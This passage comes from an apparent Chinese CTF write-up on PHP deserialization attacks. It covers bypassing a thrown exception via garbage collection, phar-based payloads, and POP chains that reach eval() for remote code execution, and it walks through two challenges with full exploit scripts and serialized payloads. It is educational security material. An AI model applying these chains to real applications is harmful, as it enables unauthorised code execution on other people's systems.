operator\">+</span> h <span class=\"token comment\"># 数据 + 签名 + (类型 + GBMB)</span>\n<span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2.phar\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"wb\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>打开2.phar文件查看一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459557.png\" alt=\"在这里插入图片描述\"><br>变成<code>i:0</code>且文件正常，接下来利用phar伪协议包含这个文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$filename</span><span class=\"token operator\">=</span>phar<span class=\"token punctuation\">:</span><span class=\"token comment\">//2.phar</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459685.png\" alt=\"在这里插入图片描述\"><br>可以发现成功输出了phpinfo。</p>\n<h1 id=\"CTF实战\"><a href=\"#CTF实战\" class=\"headerlink\" title=\"CTF实战\"></a>CTF实战</h1><h2 id=\"例题1\"><a href=\"#例题1\" class=\"headerlink\" title=\"例题1\"></a>例题1</h2><p>这道题是<code>H3018</code>大师傅在知识分享时的例题，在这里引用一下，源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg0</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"hello __destruct\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg1</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello __toString\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg2</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello __flag()\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Garbage collection\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这道题的话思路比较简单</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、首先调用__destrcut，然后通过num参数触发__tostring\n<span class=\"token number\">2</span>、给<span class=\"token keyword type-declaration\">string</span>参数赋值，调用cg2的flag方法\n<span class=\"token number\">3</span>、给cmd参数赋值，实现<span class=\"token constant\">RCE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>但我们会发现这里首先要用到的就是<code>__destruct</code>，而代码末尾带有<code>throw new Exception(&quot;Garbage collection&quot;);</code>，即异常抛出，所以我们首先需要解决的就是如何绕过他，上文在讲<code>GC中的PHP反序列化时</code>,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可，因此我们这里按照平常思路，先构造出payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg0</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg1</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cg2</span><span class=\"token punctuation\">&#123;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">cg0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">cg1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">cg2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">num</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"phpinfo();\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg0\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"num\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg1\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"string\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg2\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"phpinfo();\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将<code>i:1</code>修改为<code>i:0</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg0\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"num\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg1\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"string\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cg2\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"phpinfo();\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来去尝试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459666.png\" alt=\"在这里插入图片描述\"><br>成功触发phpinfo()</p>\n<h2 id=\"CTFShow-卷王杯-easy-unserialize\"><a href=\"#CTFShow-卷王杯-easy-unserialize\" class=\"headerlink\" title=\"CTFShow[卷王杯]easy unserialize\"></a>CTFShow[卷王杯]easy unserialize</h2><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./HappyYear.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">one</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$object</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">MeMeMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">array_walk</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$prev</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"Happy_func\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$prev</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"year_parm\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">global</span> <span class=\"token variable\">$talk</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$talk</span></span>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        @<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">second</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">addMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Wow you have sovled\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$func</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Me\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">third</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$var</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"ctfshow\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"高一新生报道\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>简单梳理一下思路，触发<code>MeMeMe</code>方法为最终目标，以<code>_destruct</code>为起点，绕过抛出异常的方式同之前即可<br>接下来看一下它的大致流程<br>首先触发<code>_destruct</code>，那这里的<code>add()</code>无疑是让我们触发<code>_call</code>魔法方法，因此接下来到<code>_call</code>这里，发现这里拼接了<code>Me</code>，那它肯定就指向了<code>addMe()</code>这个方法，接下来看到<code>$this-&gt;filename</code>，想到触发<code>_toString</code>魔术方法，接下来根进<code>_toString</code>方法，发现<code>object-&gt;string</code>，那么这个的话就是触发<code>_get</code>方法了，因此接着看<code>get()</code>魔术方法，这个时候就有一个问题，怎么通过<code>  $var[$name]();</code>来进入one类的<code>MeMeMe</code>方法，我们这里可以控制<code>$var</code>的值，当给它传值为数组，内容为类和方法时，就可成功触发类中的方法，所以我们这里给<code>$var</code>赋值为<code>[new one(),MeMeMe]</code>即可，此时还有一个问题，就是这个<code>MeMeMe</code>中的<code>function($fn, $prev)</code>如何理解，接下来我们本地测试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459781.png\" alt=\"在这里插入图片描述\"><br>发现这个<code>$fn</code>是变量值，而<code>$prev</code>则是变量名，因此这里我们新增一个变量名为<code>year_parm</code>，且其值为<code>Happy_func</code>即可绕过if语句，接下来就可以去写Exp了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">/**\n * @Author: F10wers_13eiCheng\n * @Date:   2022-02-01 11:25:02\n * @Last Modified by:   F10wers_13eiCheng\n * @Last Modified time: 2022-02-07 15:08:18\n */</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./HappyYear.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">one</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$year_parm</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Happy_func\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$object</span><span class=\"token punctuation\">;</span>\n    \n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">MeMeMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">array_walk</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$prev</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fn</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"Happy_func\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$prev</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"year_parm\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">global</span> <span class=\"token variable\">$talk</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$talk</span></span>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        @<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">second</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">addMe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Wow you have sovled\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">call_user_func</span><span class=\"token 